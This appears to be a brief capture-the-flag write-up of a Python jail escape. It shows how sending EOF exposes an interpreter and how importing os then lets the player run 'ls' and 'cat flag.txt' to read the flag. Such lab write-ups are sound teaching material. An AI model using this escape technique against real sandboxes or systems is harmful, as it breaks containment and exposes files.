1. Press `ctrl+d` to send a EOF

```
: Traceback (most recent call last):
  File "/home/user/jail.py", line 27, in <module>
      input(": ")
      EOFError
>>>
```

2. The error message and `>>>` prompt suggest that we are in a python interpreter, so we can execute command by import `os` module.

```python
>>> import os
>>> os.system('ls')
flag.txt  jail.py
0
>>> os.system('cat flag.txt')
```
